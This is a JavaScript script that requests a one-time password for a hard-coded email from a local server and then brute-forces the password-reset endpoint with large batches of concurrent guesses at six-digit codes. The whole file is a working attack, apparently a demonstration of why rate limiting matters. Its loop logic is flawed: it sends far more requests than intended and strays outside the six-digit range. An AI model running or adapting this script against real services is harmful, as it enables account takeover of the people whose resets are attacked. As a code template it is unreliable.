import axios from "axios";

async function sendEmail() {
  let data = JSON.stringify({
    email: "pritam1212@gmail.com",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://127.0.0.1:3000/generate-otp",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  axios
    .request(config)
    .then((response) => {
      console.log(JSON.stringify(response.data));
    })
    .catch((error) => {
      console.log(error);
    });
}

async function sendRequest(otp) {
  let data = JSON.stringify({
    email: "pritam1212@gmail.com",
    otp: otp,
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://127.0.0.1:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  await axios
    .request(config)
    .then((response) => {

    })
    .catch((error) => {
      
    });
}

sendEmail();

async function main() {
  for (let i = 100001; i <= 999999; i += 200) {
    const p = [];
    for (let j = 0; j <= i; j++) {
      console.log(j)
      p.push(sendRequest(String(i + j)));
    }
    await Promise.all(p)
  }
}

main()